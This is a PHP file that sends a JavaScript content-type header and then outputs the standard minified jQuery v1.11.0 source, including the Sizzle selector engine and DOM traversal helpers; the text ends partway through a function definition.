<?php
 header("Content-Type: application/javascript; charset=UTF-8");
 ?>


/*! jQuery v1.11.0 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error("jQuery requires a window with a document");return b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var c=[],d=c.slice,e=c.concat,f=c.push,g=c.indexOf,h={},i=h.toString,j=h.hasOwnProperty,k="".trim,l={},m="1.11.0",n=function(a,b){return new n.fn.init(a,b)},o=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,p=/^-ms-/,q=/-([\da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype={jquery:m,constructor:n,selector:"",length:0,toArray:function(){return d.call(this)},get:function(a){return null!=a?0>a?this[a+this.length]:this[a]:d.call(this)},pushStack:function(a){var b=n.merge(this.constructor(),a);return b.prevObject=this,b.context=this.context,b},each:function(a,b){return n.each(this,a,b)},map:function(a){return this.pushStack(n.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return this.pushStack(d.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(a){var b=this.length,c=+a+(0>a?b:0);return this.pushStack(c>=0&&b>c?[this[c]]:[])},end:function(){return this.prevObject||this.constructor(null)},push:f,sort:c.sort,splice:c.splice},n.extend=n.fn.extend=function(){var a,b,c,d,e,f,g=arguments[0]||{},h=1,i=arguments.length,j=!1;for("boolean"==typeof g&&(j=g,g=arguments[h]||{},h++),"object"==typeof g||n.isFunction(g)||(g={}),h===i&&(g=this,h--);i>h;h++)if(null!=(e=arguments[h]))for(d in e)a=g[d],c=e[d],g!==c&&(j&&c&&(n.isPlainObject(c)||(b=n.isArray(c)))?(b?(b=!1,f=a&&n.isArray(a)?a:[]):f=a&&n.isPlainObject(a)?a:{},g[d]=n.extend(j,f,c)):void 0!==c&&(g[d]=c));return g},n.extend({expando:"jQuery"+(m+Math.random()).replace(/\D/g,""),isReady:!0,error:function(a){throw new Error(a)},noop:function(){},isFunction:function(a){return"function"===n.type(a)},isArray:Array.isArray||function(a){return"array"===n.type(a)},isWindow:function(a){return null!=a&&a==a.window},isNumeric:function(a){return a-parseFloat(a)>=0},isEmptyObject:function(a){var b;for(b in a)return!1;return!0},isPlainObject:function(a){var b;if(!a||"object"!==n.type(a)||a.nodeType||n.isWindow(a))return!1;try{if(a.constructor&&!j.call(a,"constructor")&&!j.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}if(l.ownLast)for(b in a)return j.call(a,b);for(b in a);return void 0===b||j.call(a,b)},type:function(a){return null==a?a+"":"object"==typeof a||"function"==typeof a?h[i.call(a)]||"object":typeof a},globalEval:function(b){b&&n.trim(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(p,"ms-").replace(q,r)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toLowerCase()===b.toLowerCase()},each:function(a,b,c){var d,e=0,f=a.length,g=s(a);if(c){if(g){for(;f>e;e++)if(d=b.apply(a[e],c),d===!1)break}else for(e in a)if(d=b.apply(a[e],c),d===!1)break}else if(g){for(;f>e;e++)if(d=b.call(a[e],e,a[e]),d===!1)break}else for(e in a)if(d=b.call(a[e],e,a[e]),d===!1)break;return a},trim:k&&!k.call("\ufeff\xa0")?function(a){return null==a?"":k.call(a)}:function(a){return null==a?"":(a+"").replace(o,"")},makeArray:function(a,b){var c=b||[];return null!=a&&(s(Object(a))?n.merge(c,"string"==typeof a?[a]:a):f.call(c,a)),c},inArray:function(a,b,c){var d;if(b){if(g)return g.call(b,a,c);for(d=b.length,c=c?0>c?Math.max(0,d+c):c:0;d>c;c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,b){var c=+b.length,d=0,e=a.length;while(c>d)a[e++]=b[d++];if(c!==c)while(void 0!==b[d])a[e++]=b[d++];return a.length=e,a},grep:function(a,b,c){for(var d,e=[],f=0,g=a.length,h=!c;g>f;f++)d=!b(a[f],f),d!==h&&e.push(a[f]);return e},map:function(a,b,c){var d,f=0,g=a.length,h=s(a),i=[];if(h)for(;g>f;f++)d=b(a[f],f,c),null!=d&&i.push(d);else for(f in a)d=b(a[f],f,c),null!=d&&i.push(d);return e.apply([],i)},guid:1,proxy:function(a,b){var c,e,f;return"string"==typeof b&&(f=a[b],b=a,a=f),n.isFunction(a)?(c=d.call(arguments,2),e=function(){return a.apply(b||this,c.concat(d.call(arguments)))},e.guid=a.guid=a.guid||n.guid++,e):void 0},now:function(){return+new Date},support:l}),n.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){h["[object "+b+"]"]=b.toLowerCase()});function s(a){var b=a.length,c=n.type(a);return"function"===c||n.isWindow(a)?!1:1===a.nodeType&&b?!0:"array"===c||0===b||"number"==typeof b&&b>0&&b-1 in a}var t=function(a){var b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s="sizzle"+-new Date,t=a.document,u=0,v=0,w=eb(),x=eb(),y=eb(),z=function(a,b){return a===b&&(j=!0),0},A="undefined",B=1<<31,C={}.hasOwnProperty,D=[],E=D.pop,F=D.push,G=D.push,H=D.slice,I=D.indexOf||function(a){for(var b=0,c=this.length;c>b;b++)if(this[b]===a)return b;return-1},J="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",K="[\\x20\\t\\r\\n\\f]",L="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",M=L.replace("w","w#"),N="\\["+K+"*("+L+")"+K+"*(?:([*^$|!~]?=)"+K+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+M+")|)|)"+K+"*\\]",O=":("+L+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+N.replace(3,8)+")*)|.*)\\)|)",P=new RegExp("^"+K+"+|((?:^|[^\\\\])(?:\\\\.)*)"+K+"+$","g"),Q=new RegExp("^"+K+"*,"+K+"*"),R=new RegExp("^"+K+"*([>+~]|"+K+")"+K+"*"),S=new RegExp("="+K+"*([^\\]'\"]*?)"+K+"*\\]","g"),T=new RegExp(O),U=new RegExp("^"+M+"$"),V={ID:new RegExp("^#("+L+")"),CLASS:new RegExp("^\\.("+L+")"),TAG:new RegExp("^("+L.replace("w","w*")+")"),ATTR:new RegExp("^"+N),PSEUDO:new RegExp("^"+O),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+K+"*(even|odd|(([+-]|)(\\d*)n|)"+K+"*(?:([+-]|)"+K+"*(\\d+)|))"+K+"*\\)|)","i"),bool:new RegExp("^(?:"+J+")$","i"),needsContext:new RegExp("^"+K+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+K+"*((?:-\\d)?\\d*)"+K+"*\\)|)(?=[^-]|$)","i")},W=/^(?:input|select|textarea|button)$/i,X=/^h\d$/i,Y=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,$=/[+~]/,_=/'|\\/g,ab=new RegExp("\\\\([\\da-f]{1,6}"+K+"?|("+K+")|.)","ig"),bb=function(a,b,c){var d="0x"+b-65536;return d!==d||c?b:0>d?String.fromCharCode(d+65536):String.fromCharCode(d>>10|55296,1023&d|56320)};try{G.apply(D=H.call(t.childNodes),t.childNodes),D[t.childNodes.length].nodeType}catch(cb){G={apply:D.length?function(a,b){F.apply(a,H.call(b))}:function(a,b){var c=a.length,d=0;while(a[c++]=b[d++]);a.length=c-1}}}function db(a,b,d,e){var f,g,h,i,j,m,p,q,u,v;if((b?b.ownerDocument||b:t)!==l&&k(b),b=b||l,d=d||[],!a||"string"!=typeof a)return d;if(1!==(i=b.nodeType)&&9!==i)return[];if(n&&!e){if(f=Z.exec(a))if(h=f[1]){if(9===i){if(g=b.getElementById(h),!g||!g.parentNode)return d;if(g.id===h)return d.push(g),d}else if(b.ownerDocument&&(g=b.ownerDocument.getElementById(h))&&r(b,g)&&g.id===h)return d.push(g),d}else{if(f[2])return G.apply(d,b.getElementsByTagName(a)),d;if((h=f[3])&&c.getElementsByClassName&&b.getElementsByClassName)return G.apply(d,b.getElementsByClassName(h)),d}if(c.qsa&&(!o||!o.test(a))){if(q=p=s,u=b,v=9===i&&a,1===i&&"object"!==b.nodeName.toLowerCase()){m=ob(a),(p=b.getAttribute("id"))?q=p.replace(_,"\\$&"):b.setAttribute("id",q),q="[id='"+q+"'] ",j=m.length;while(j--)m[j]=q+pb(m[j]);u=$.test(a)&&mb(b.parentNode)||b,v=m.join(",")}if(v)try{return G.apply(d,u.querySelectorAll(v)),d}catch(w){}finally{p||b.removeAttribute("id")}}}return xb(a.replace(P,"$1"),b,d,e)}function eb(){var a=[];function b(c,e){return a.push(c+" ")>d.cacheLength&&delete b[a.shift()],b[c+" "]=e}return b}function fb(a){return a[s]=!0,a}function gb(a){var b=l.createElement("div");try{return!!a(b)}catch(c){return!1}finally{b.parentNode&&b.parentNode.removeChild(b),b=null}}function hb(a,b){var c=a.split("|"),e=a.length;while(e--)d.attrHandle[c[e]]=b}function ib(a,b){var c=b&&a,d=c&&1===a.nodeType&&1===b.nodeType&&(~b.sourceIndex||B)-(~a.sourceIndex||B);if(d)return d;if(c)while(c=c.nextSibling)if(c===b)return-1;return a?1:-1}function jb(a){return function(b){var c=b.nodeName.toLowerCase();return"input"===c&&b.type===a}}function kb(a){return function(b){var c=b.nodeName.toLowerCase();return("input"===c||"button"===c)&&b.type===a}}function lb(a){return fb(function(b){return b=+b,fb(function(c,d){var e,f=a([],c.length,b),g=f.length;while(g--)c[e=f[g]]&&(c[e]=!(d[e]=c[e]))})})}function mb(a){return a&&typeof a.getElementsByTagName!==A&&a}c=db.support={},f=db.isXML=function(a){var b=a&&(a.ownerDocument||a).documentElement;return b?"HTML"!==b.nodeName:!1},k=db.setDocument=function(a){var b,e=a?a.ownerDocument||a:t,g=e.defaultView;return e!==l&&9===e.nodeType&&e.documentElement?(l=e,m=e.documentElement,n=!f(e),g&&g!==g.top&&(g.addEventListener?g.addEventListener("unload",function(){k()},!1):g.attachEvent&&g.attachEvent("onunload",function(){k()})),c.attributes=gb(function(a){return a.className="i",!a.getAttribute("className")}),c.getElementsByTagName=gb(function(a){return a.appendChild(e.createComment("")),!a.getElementsByTagName("*").length}),c.getElementsByClassName=Y.test(e.getElementsByClassName)&&gb(function(a){return a.innerHTML="<div class='a'></div><div class='a i'></div>",a.firstChild.className="i",2===a.getElementsByClassName("i").length}),c.getById=gb(function(a){return m.appendChild(a).id=s,!e.getElementsByName||!e.getElementsByName(s).length}),c.getById?(d.find.ID=function(a,b){if(typeof b.getElementById!==A&&n){var c=b.getElementById(a);return c&&c.parentNode?[c]:[]}},d.filter.ID=function(a){var b=a.replace(ab,bb);return function(a){return a.getAttribute("id")===b}}):(delete d.find.ID,d.filter.ID=function(a){var b=a.replace(ab,bb);return function(a){var c=typeof a.getAttributeNode!==A&&a.getAttributeNode("id");return c&&c.value===b}}),d.find.TAG=c.getElementsByTagName?function(a,b){return typeof b.getElementsByTagName!==A?b.getElementsByTagName(a):void 0}:function(a,b){var c,d=[],e=0,f=b.getElementsByTagName(a);if("*"===a){while(c=f[e++])1===c.nodeType&&d.push(c);return d}return f},d.find.CLASS=c.getElementsByClassName&&function(a,b){return typeof b.getElementsByClassName!==A&&n?b.getElementsByClassName(a):void 0},p=[],o=[],(c.qsa=Y.test(e.querySelectorAll))&&(gb(function(a){a.innerHTML="<select t=''><option selected=''></option></select>",a.querySelectorAll("[t^='']").length&&o.push("[*^$]="+K+"*(?:''|\"\")"),a.querySelectorAll("[selected]").length||o.push("\\["+K+"*(?:value|"+J+")"),a.querySelectorAll(":checked").length||o.push(":checked")}),gb(function(a){var b=e.createElement("input");b.setAttribute("type","hidden"),a.appendChild(b).setAttribute("name","D"),a.querySelectorAll("[name=d]").length&&o.push("name"+K+"*[*^$|!~]?="),a.querySelectorAll(":enabled").length||o.push(":enabled",":disabled"),a.querySelectorAll("*,:x"),o.push(",.*:")})),(c.matchesSelector=Y.test(q=m.webkitMatchesSelector||m.mozMatchesSelector||m.oMatchesSelector||m.msMatchesSelector))&&gb(function(a){c.disconnectedMatch=q.call(a,"div"),q.call(a,"[s!='']:x"),p.push("!=",O)}),o=o.length&&new RegExp(o.join("|")),p=p.length&&new RegExp(p.join("|")),b=Y.test(m.compareDocumentPosition),r=b||Y.test(m.contains)?function(a,b){var c=9===a.nodeType?a.documentElement:a,d=b&&b.parentNode;return a===d||!(!d||1!==d.nodeType||!(c.contains?c.contains(d):a.compareDocumentPosition&&16&a.compareDocumentPosition(d)))}:function(a,b){if(b)while(b=b.parentNode)if(b===a)return!0;return!1},z=b?function(a,b){if(a===b)return j=!0,0;var d=!a.compareDocumentPosition-!b.compareDocumentPosition;return d?d:(d=(a.ownerDocument||a)===(b.ownerDocument||b)?a.compareDocumentPosition(b):1,1&d||!c.sortDetached&&b.compareDocumentPosition(a)===d?a===e||a.ownerDocument===t&&r(t,a)?-1:b===e||b.ownerDocument===t&&r(t,b)?1:i?I.call(i,a)-I.call(i,b):0:4&d?-1:1)}:function(a,b){if(a===b)return j=!0,0;var c,d=0,f=a.parentNode,g=b.parentNode,h=[a],k=[b];if(!f||!g)return a===e?-1:b===e?1:f?-1:g?1:i?I.call(i,a)-I.call(i,b):0;if(f===g)return ib(a,b);c=a;while(c=c.parentNode)h.unshift(c);c=b;while(c=c.parentNode)k.unshift(c);while(h[d]===k[d])d++;return d?ib(h[d],k[d]):h[d]===t?-1:k[d]===t?1:0},e):l},db.matches=function(a,b){return db(a,null,null,b)},db.matchesSelector=function(a,b){if((a.ownerDocument||a)!==l&&k(a),b=b.replace(S,"='$1']"),!(!c.matchesSelector||!n||p&&p.test(b)||o&&o.test(b)))try{var d=q.call(a,b);if(d||c.disconnectedMatch||a.document&&11!==a.document.nodeType)return d}catch(e){}return db(b,l,null,[a]).length>0},db.contains=function(a,b){return(a.ownerDocument||a)!==l&&k(a),r(a,b)},db.attr=function(a,b){(a.ownerDocument||a)!==l&&k(a);var e=d.attrHandle[b.toLowerCase()],f=e&&C.call(d.attrHandle,b.toLowerCase())?e(a,b,!n):void 0;return void 0!==f?f:c.attributes||!n?a.getAttribute(b):(f=a.getAttributeNode(b))&&f.specified?f.value:null},db.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)},db.uniqueSort=function(a){var b,d=[],e=0,f=0;if(j=!c.detectDuplicates,i=!c.sortStable&&a.slice(0),a.sort(z),j){while(b=a[f++])b===a[f]&&(e=d.push(f));while(e--)a.splice(d[e],1)}return i=null,a},e=db.getText=function(a){var b,c="",d=0,f=a.nodeType;if(f){if(1===f||9===f||11===f){if("string"==typeof a.textContent)return a.textContent;for(a=a.firstChild;a;a=a.nextSibling)c+=e(a)}else if(3===f||4===f)return a.nodeValue}else while(b=a[d++])c+=e(b);return c},d=db.selectors={cacheLength:50,createPseudo:fb,match:V,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(a){return a[1]=a[1].replace(ab,bb),a[3]=(a[4]||a[5]||"").replace(ab,bb),"~="===a[2]&&(a[3]=" "+a[3]+" "),a.slice(0,4)},CHILD:function(a){return a[1]=a[1].toLowerCase(),"nth"===a[1].slice(0,3)?(a[3]||db.error(a[0]),a[4]=+(a[4]?a[5]+(a[6]||1):2*("even"===a[3]||"odd"===a[3])),a[5]=+(a[7]+a[8]||"odd"===a[3])):a[3]&&db.error(a[0]),a},PSEUDO:function(a){var b,c=!a[5]&&a[2];return V.CHILD.test(a[0])?null:(a[3]&&void 0!==a[4]?a[2]=a[4]:c&&T.test(c)&&(b=ob(c,!0))&&(b=c.indexOf(")",c.length-b)-c.length)&&(a[0]=a[0].slice(0,b),a[2]=c.slice(0,b)),a.slice(0,3))}},filter:{TAG:function(a){var b=a.replace(ab,bb).toLowerCase();return"*"===a?function(){return!0}:function(a){return a.nodeName&&a.nodeName.toLowerCase()===b}},CLASS:function(a){var b=w[a+" "];return b||(b=new RegExp("(^|"+K+")"+a+"("+K+"|$)"))&&w(a,function(a){return b.test("string"==typeof a.className&&a.className||typeof a.getAttribute!==A&&a.getAttribute("class")||"")})},ATTR:function(a,b,c){return function(d){var e=db.attr(d,a);return null==e?"!="===b:b?(e+="","="===b?e===c:"!="===b?e!==c:"^="===b?c&&0===e.indexOf(c):"*="===b?c&&e.indexOf(c)>-1:"$="===b?c&&e.slice(-c.length)===c:"~="===b?(" "+e+" ").indexOf(c)>-1:"|="===b?e===c||e.slice(0,c.length+1)===c+"-":!1):!0}},CHILD:function(a,b,c,d,e){var f="nth"!==a.slice(0,3),g="last"!==a.slice(-4),h="of-type"===b;return 1===d&&0===e?function(a){return!!a.parentNode}:function(b,c,i){var j,k,l,m,n,o,p=f!==g?"nextSibling":"previousSibling",q=b.parentNode,r=h&&b.nodeName.toLowerCase(),t=!i&&!h;if(q){if(f){while(p){l=b;while(l=l[p])if(h?l.nodeName.toLowerCase()===r:1===l.nodeType)return!1;o=p="only"===a&&!o&&"nextSibling"}return!0}if(o=[g?q.firstChild:q.lastChild],g&&t){k=q[s]||(q[s]={}),j=k[a]||[],n=j[0]===u&&j[1],m=j[0]===u&&j[2],l=n&&q.childNodes[n];while(l=++n&&l&&l[p]||(m=n=0)||o.pop())if(1===l.nodeType&&++m&&l===b){k[a]=[u,n,m];break}}else if(t&&(j=(b[s]||(b[s]={}))[a])&&j[0]===u)m=j[1];else while(l=++n&&l&&l[p]||(m=n=0)||o.pop())if((h?l.nodeName.toLowerCase()===r:1===l.nodeType)&&++m&&(t&&((l[s]||(l[s]={}))[a]=[u,m]),l===b))break;return m-=e,m===d||m%d===0&&m/d>=0}}},PSEUDO:function(a,b){var c,e=d.pseudos[a]||d.setFilters[a.toLowerCase()]||db.error("unsupported pseudo: "+a);return e[s]?e(b):e.length>1?(c=[a,a,"",b],d.setFilters.hasOwnProperty(a.toLowerCase())?fb(function(a,c){var d,f=e(a,b),g=f.length;while(g--)d=I.call(a,f[g]),a[d]=!(c[d]=f[g])}):function(a){return e(a,0,c)}):e}},pseudos:{not:fb(function(a){var b=[],c=[],d=g(a.replace(P,"$1"));return d[s]?fb(function(a,b,c,e){var f,g=d(a,null,e,[]),h=a.length;while(h--)(f=g[h])&&(a[h]=!(b[h]=f))}):function(a,e,f){return b[0]=a,d(b,null,f,c),!c.pop()}}),has:fb(function(a){return function(b){return db(a,b).length>0}}),contains:fb(function(a){return function(b){return(b.textContent||b.innerText||e(b)).indexOf(a)>-1}}),lang:fb(function(a){return U.test(a||"")||db.error("unsupported lang: "+a),a=a.replace(ab,bb).toLowerCase(),function(b){var c;do if(c=n?b.lang:b.getAttribute("xml:lang")||b.getAttribute("lang"))return c=c.toLowerCase(),c===a||0===c.indexOf(a+"-");while((b=b.parentNode)&&1===b.nodeType);return!1}}),target:function(b){var c=a.location&&a.location.hash;return c&&c.slice(1)===b.id},root:function(a){return a===m},focus:function(a){return a===l.activeElement&&(!l.hasFocus||l.hasFocus())&&!!(a.type||a.href||~a.tabIndex)},enabled:function(a){return a.disabled===!1},disabled:function(a){return a.disabled===!0},checked:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&!!a.checked||"option"===b&&!!a.selected},selected:function(a){return a.parentNode&&a.parentNode.selectedIndex,a.selected===!0},empty:function(a){for(a=a.firstChild;a;a=a.nextSibling)if(a.nodeType<6)return!1;return!0},parent:function(a){return!d.pseudos.empty(a)},header:function(a){return X.test(a.nodeName)},input:function(a){return W.test(a.nodeName)},button:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&"button"===a.type||"button"===b},text:function(a){var b;return"input"===a.nodeName.toLowerCase()&&"text"===a.type&&(null==(b=a.getAttribute("type"))||"text"===b.toLowerCase())},first:lb(function(){return[0]}),last:lb(function(a,b){return[b-1]}),eq:lb(function(a,b,c){return[0>c?c+b:c]}),even:lb(function(a,b){for(var c=0;b>c;c+=2)a.push(c);return a}),odd:lb(function(a,b){for(var c=1;b>c;c+=2)a.push(c);return a}),lt:lb(function(a,b,c){for(var d=0>c?c+b:c;--d>=0;)a.push(d);return a}),gt:lb(function(a,b,c){for(var d=0>c?c+b:c;++d<b;)a.push(d);return a})}},d.pseudos.nth=d.pseudos.eq;for(b in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})d.pseudos[b]=jb(b);for(b in{submit:!0,reset:!0})d.pseudos[b]=kb(b);function nb(){}nb.prototype=d.filters=d.pseudos,d.setFilters=new nb;function ob(a,b){var c,e,f,g,h,i,j,k=x[a+" "];if(k)return b?0:k.slice(0);h=a,i=[],j=d.preFilter;while(h){(!c||(e=Q.exec(h)))&&(e&&(h=h.slice(e[0].length)||h),i.push(f=[])),c=!1,(e=R.exec(h))&&(c=e.shift(),f.push({value:c,type:e[0].replace(P," ")}),h=h.slice(c.length));for(g in d.filter)!(e=V[g].exec(h))||j[g]&&!(e=j[g](e))||(c=e.shift(),f.push({value:c,type:g,matches:e}),h=h.slice(c.length));if(!c)break}return b?h.length:h?db.error(a):x(a,i).slice(0)}function pb(a){for(var b=0,c=a.length,d="";c>b;b++)d+=a[b].value;return d}function qb(a,b,c){var d=b.dir,e=c&&"parentNode"===d,f=v++;return b.first?function(b,c,f){while(b=b[d])if(1===b.nodeType||e)return a(b,c,f)}:function(b,c,g){var h,i,j=[u,f];if(g){while(b=b[d])if((1===b.nodeType||e)&&a(b,c,g))return!0}else while(b=b[d])if(1===b.nodeType||e){if(i=b[s]||(b[s]={}),(h=i[d])&&h[0]===u&&h[1]===f)return j[2]=h[2];if(i[d]=j,j[2]=a(b,c,g))return!0}}}function rb(a){return a.length>1?function(b,c,d){var e=a.length;while(e--)if(!a[e](b,c,d))return!1;return!0}:a[0]}function sb(a,b,c,d,e){for(var f,g=[],h=0,i=a.length,j=null!=b;i>h;h++)(f=a[h])&&(!c||c(f,d,e))&&(g.push(f),j&&b.push(h));return g}function tb(a,b,c,d,e,f){return d&&!d[s]&&(d=tb(d)),e&&!e[s]&&(e=tb(e,f)),fb(function(f,g,h,i){var j,k,l,m=[],n=[],o=g.length,p=f||wb(b||"*",h.nodeType?[h]:h,[]),q=!a||!f&&b?p:sb(p,m,a,h,i),r=c?e||(f?a:o||d)?[]:g:q;if(c&&c(q,r,h,i),d){j=sb(r,n),d(j,[],h,i),k=j.length;while(k--)(l=j[k])&&(r[n[k]]=!(q[n[k]]=l))}if(f){if(e||a){if(e){j=[],k=r.length;while(k--)(l=r[k])&&j.push(q[k]=l);e(null,r=[],j,i)}k=r.length;while(k--)(l=r[k])&&(j=e?I.call(f,l):m[k])>-1&&(f[j]=!(g[j]=l))}}else r=sb(r===g?r.splice(o,r.length):r),e?e(null,g,r,i):G.apply(g,r)})}function ub(a){for(var b,c,e,f=a.length,g=d.relative[a[0].type],i=g||d.relative[" "],j=g?1:0,k=qb(function(a){return a===b},i,!0),l=qb(function(a){return I.call(b,a)>-1},i,!0),m=[function(a,c,d){return!g&&(d||c!==h)||((b=c).nodeType?k(a,c,d):l(a,c,d))}];f>j;j++)if(c=d.relative[a[j].type])m=[qb(rb(m),c)];else{if(c=d.filter[a[j].type].apply(null,a[j].matches),c[s]){for(e=++j;f>e;e++)if(d.relative[a[e].type])break;return tb(j>1&&rb(m),j>1&&pb(a.slice(0,j-1).concat({value:" "===a[j-2].type?"*":""})).replace(P,"$1"),c,e>j&&ub(a.slice(j,e)),f>e&&ub(a=a.slice(e)),f>e&&pb(a))}m.push(c)}return rb(m)}function vb(a,b){var c=b.length>0,e=a.length>0,f=function(f,g,i,j,k){var m,n,o,p=0,q="0",r=f&&[],s=[],t=h,v=f||e&&d.find.TAG("*",k),w=u+=null==t?1:Math.random()||.1,x=v.length;for(k&&(h=g!==l&&g);q!==x&&null!=(m=v[q]);q++){if(e&&m){n=0;while(o=a[n++])if(o(m,g,i)){j.push(m);break}k&&(u=w)}c&&((m=!o&&m)&&p--,f&&r.push(m))}if(p+=q,c&&q!==p){n=0;while(o=b[n++])o(r,s,g,i);if(f){if(p>0)while(q--)r[q]||s[q]||(s[q]=E.call(j));s=sb(s)}G.apply(j,s),k&&!f&&s.length>0&&p+b.length>1&&db.uniqueSort(j)}return k&&(u=w,h=t),r};return c?fb(f):f}g=db.compile=function(a,b){var c,d=[],e=[],f=y[a+" "];if(!f){b||(b=ob(a)),c=b.length;while(c--)f=ub(b[c]),f[s]?d.push(f):e.push(f);f=y(a,vb(e,d))}return f};function wb(a,b,c){for(var d=0,e=b.length;e>d;d++)db(a,b[d],c);return c}function xb(a,b,e,f){var h,i,j,k,l,m=ob(a);if(!f&&1===m.length){if(i=m[0]=m[0].slice(0),i.length>2&&"ID"===(j=i[0]).type&&c.getById&&9===b.nodeType&&n&&d.relative[i[1].type]){if(b=(d.find.ID(j.matches[0].replace(ab,bb),b)||[])[0],!b)return e;a=a.slice(i.shift().value.length)}h=V.needsContext.test(a)?0:i.length;while(h--){if(j=i[h],d.relative[k=j.type])break;if((l=d.find[k])&&(f=l(j.matches[0].replace(ab,bb),$.test(i[0].type)&&mb(b.parentNode)||b))){if(i.splice(h,1),a=f.length&&pb(i),!a)return G.apply(e,f),e;break}}}return g(a,m)(f,b,!n,e,$.test(a)&&mb(b.parentNode)||b),e}return c.sortStable=s.split("").sort(z).join("")===s,c.detectDuplicates=!!j,k(),c.sortDetached=gb(function(a){return 1&a.compareDocumentPosition(l.createElement("div"))}),gb(function(a){return a.innerHTML="<a href='#'></a>","#"===a.firstChild.getAttribute("href")})||hb("type|href|height|width",function(a,b,c){return c?void 0:a.getAttribute(b,"type"===b.toLowerCase()?1:2)}),c.attributes&&gb(function(a){return a.innerHTML="<input/>",a.firstChild.setAttribute("value",""),""===a.firstChild.getAttribute("value")})||hb("value",function(a,b,c){return c||"input"!==a.nodeName.toLowerCase()?void 0:a.defaultValue}),gb(function(a){return null==a.getAttribute("disabled")})||hb(J,function(a,b,c){var d;return c?void 0:a[b]===!0?b.toLowerCase():(d=a.getAttributeNode(b))&&d.specified?d.value:null}),db}(a);n.find=t,n.expr=t.selectors,n.expr[":"]=n.expr.pseudos,n.unique=t.uniqueSort,n.text=t.getText,n.isXMLDoc=t.isXML,n.contains=t.contains;var u=n.expr.match.needsContext,v=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,w=/^.[^:#\[\.,]*$/;function x(a,b,c){if(n.isFunction(b))return n.grep(a,function(a,d){return!!b.call(a,d,a)!==c});if(b.nodeType)return n.grep(a,function(a){return a===b!==c});if("string"==typeof b){if(w.test(b))return n.filter(b,a,c);b=n.filter(b,a)}return n.grep(a,function(a){return n.inArray(a,b)>=0!==c})}n.filter=function(a,b,c){var d=b[0];return c&&(a=":not("+a+")"),1===b.length&&1===d.nodeType?n.find.matchesSelector(d,a)?[d]:[]:n.find.matches(a,n.grep(b,function(a){return 1===a.nodeType}))},n.fn.extend({find:function(a){var b,c=[],d=this,e=d.length;if("string"!=typeof a)return this.pushStack(n(a).filter(function(){for(b=0;e>b;b++)if(n.contains(d[b],this))return!0}));for(b=0;e>b;b++)n.find(a,d[b],c);return c=this.pushStack(e>1?n.unique(c):c),c.selector=this.selector?this.selector+" "+a:a,c},filter:function(a){return this.pushStack(x(this,a||[],!1))},not:function(a){return this.pushStack(x(this,a||[],!0))},is:function(a){return!!x(this,"string"==typeof a&&u.test(a)?n(a):a||[],!1).length}});var y,z=a.document,A=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,B=n.fn.init=function(a,b){var c,d;if(!a)return this;if("string"==typeof a){if(c="<"===a.charAt(0)&&">"===a.charAt(a.length-1)&&a.length>=3?[null,a,null]:A.exec(a),!c||!c[1]&&b)return!b||b.jquery?(b||y).find(a):this.constructor(b).find(a);if(c[1]){if(b=b instanceof n?b[0]:b,n.merge(this,n.parseHTML(c[1],b&&b.nodeType?b.ownerDocument||b:z,!0)),v.test(c[1])&&n.isPlainObject(b))for(c in b)n.isFunction(this[c])?this[c](b[c]):this.attr(c,b[c]);return this}if(d=z.getElementById(c[2]),d&&d.parentNode){if(d.id!==c[2])return y.find(a);this.length=1,this[0]=d}return this.context=z,this.selector=a,this}return a.nodeType?(this.context=this[0]=a,this.length=1,this):n.isFunction(a)?"undefined"!=typeof y.ready?y.ready(a):a(n):(void 0!==a.selector&&(this.selector=a.selector,this.context=a.context),n.makeArray(a,this))};B.prototype=n.fn,y=n(z);var C=/^(?:parents|prev(?:Until|All))/,D={children:!0,contents:!0,next:!0,prev:!0};n.extend({dir:function(a,b,c){var d=[],e=a[b];while(e&&9!==e.nodeType&&(void 0===c||1!==e.nodeType||!n(e).is(c)))1===e.nodeType&&d.push(e),e=e[b];return d},sibling:function(a,b){for(var c=[];a;a=a.nextSibling)1===a.nodeType&&a!==b&&c.push(a);return c}}),n.fn.extend({has:function(a){var b,c=n(a,this),d=c.length;return this.filter(function(){for(b=0;d>b;b++)if(n.contains(this,c[b]))return!0})},closest:function(a,b){for(var c,d=0,e=this.length,f=[],g=u.test(a)||"string"!=typeof a?n(a,b||this.context):0;e>d;d++)for(c=this[d];c&&c!==b;c=c.parentNode)if(c.nodeType<11&&(g?g.index(c)>-1:1===c.nodeType&&n.find.matchesSelector(c,a))){f.push(c);break}return this.pushStack(f.length>1?n.unique(f):f)},index:function(a){return a?"string"==typeof a?n.inArray(this[0],n(a)):n.inArray(a.jquery?a[0]:a,this):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(a,b){return 